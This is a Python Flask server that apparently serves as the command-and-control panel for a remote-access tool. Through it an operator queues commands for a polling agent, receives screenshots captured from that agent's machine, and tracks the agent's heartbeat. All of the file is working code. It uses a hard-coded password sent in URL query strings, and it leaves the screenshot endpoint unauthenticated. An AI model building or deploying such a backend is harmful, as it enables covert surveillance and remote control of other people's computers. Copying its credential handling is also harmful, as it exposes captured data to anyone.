from flask import Flask, request, send_file, render_template, jsonify
import os
import json
from datetime import datetime

app = Flask(__name__)
PANEL_PASSWORD = "@REDXPRIME"
COMMAND_FILE = "command.json"
last_ping = None  # Track agent heartbeat

@app.route("/")
def dashboard():
    return render_template("dashboard.html")

@app.route("/add_command", methods=["POST"])
def add_command():
    password = request.args.get("pass")
    if password != PANEL_PASSWORD:
        return "Unauthorized", 403
    data = request.get_json()
    with open(COMMAND_FILE, "w") as f:
        json.dump(data, f)
    return "Command set"

@app.route("/get_command")
def get_command():
    password = request.args.get("pass")
    if password != PANEL_PASSWORD:
        return jsonify({"error": "Unauthorized"}), 403
    if not os.path.exists(COMMAND_FILE):
        return jsonify({})
    with open(COMMAND_FILE, "r") as f:
        cmd = json.load(f)
    os.remove(COMMAND_FILE)
    return jsonify(cmd)

@app.route("/upload_screenshot", methods=["POST"])
def upload_screenshot():
    password = request.args.get("pass")
    if password != PANEL_PASSWORD:
        return "Unauthorized", 403
    file = request.files["file"]
    file.save("latest.jpg")
    return "Screenshot uploaded"

@app.route("/get_screenshot")
def get_screenshot():
    try:
        return send_file("latest.jpg", mimetype='image/jpeg')
    except FileNotFoundError:
        return "❌ No screenshot uploaded yet", 404

@app.route("/ping", methods=["POST"])
def ping():
    global last_ping
    password = request.args.get("pass")
    if password != PANEL_PASSWORD:
        return "Unauthorized", 403
    last_ping = datetime.utcnow()
    return "Pong", 200

@app.route("/status")
def status():
    if last_ping:
        seconds = (datetime.utcnow() - last_ping).total_seconds()
        if seconds < 10:
            return jsonify({"status": "online"})
    return jsonify({"status": "offline"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
